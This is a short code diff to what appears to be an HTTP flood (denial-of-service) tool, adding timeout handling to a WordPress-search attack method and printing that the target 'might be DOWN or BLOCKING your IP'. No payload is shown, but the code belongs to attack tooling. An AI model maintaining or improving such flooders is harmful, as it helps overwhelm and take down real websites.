@@ -1598,8 +1598,11 @@ class HttpFlood(Thread):
                 
                 Tools.send(s, payload)
         except Exception as e:
-            print(f"[DEBUG] WP_SEARCH Error: {e}") 
-            pass # Keep it clean for user, but structure is ready for debugging if needed
+            if "timed out" in str(e) or "Timeout" in str(e):
+                print(f"[DEBUG] Connection Timeout! (Target Might be DOWN or BLOCKING your IP)")
+            else:
+                print(f"[DEBUG] WP_SEARCH Error: {e}") 
+            pass
         Tools.safe_close(s)
 
     def XMLRPC_AMP(self):
